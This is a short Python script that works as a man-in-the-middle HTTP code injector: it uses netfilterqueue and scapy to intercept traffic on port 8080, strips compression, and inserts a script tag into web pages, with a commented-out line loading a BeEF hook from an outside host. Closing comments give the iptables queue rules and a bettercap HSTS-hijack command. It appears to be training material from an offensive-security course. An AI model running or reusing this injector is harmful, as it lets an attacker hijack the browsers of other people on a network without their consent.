#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    new_packet= packet
    del new_packet[scapy.IP].len
    del new_packet[scapy.IP].chksum
    del new_packet[scapy.TCP].chksum
    new_packet[scapy.Raw].load = load

    return new_packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        try:
            load=scapy_packet[scapy.Raw].load.decode()
            if scapy.TCP in scapy_packet and scapy_packet[scapy.TCP].dport == 8080:  # Outgoing HTTP request
                print("[+] Request")
                load= re.sub("Accept-Encoding:.*?\r\n", "", load)
                load= load.replace("HTTP/1.1", "HTTP/1.0")
            elif scapy.TCP in scapy_packet and scapy_packet[scapy.TCP].sport == 8080:  # Incoming HTTP response
                print("[+] Response")
                injection_code="<script>alert('ya-baby')</script>"
                # injection_code="<script src='http://192.168.119.139:3000/hook.js'></script>"
                load = load.replace(
                    "</body>",
                    str(injection_code) +  "</body>"
                )
                content_length_search = re.search("(?:Content-Length:\s)(\d*)",load)
                if content_length_search:
                    content_length = int(content_length_search.group(1))
                    new_content_length = content_length + int(len(injection_code))
                    load=load.replace(str(content_length), str(new_content_length))

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))  # Convert to bytes
        except UnicodeDecodeError:
            pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

#to run https: bettercap -iface eth0 -caplet hstshijack/hstshijack
# run: iptables -I INPUT -j NFQUEUE --queue-num 0 or whatever is on line 46
# run: iptables -I OUTPUT -j NFQUEUE --queue-num 0 or whatever is on line 46
#not FORWARD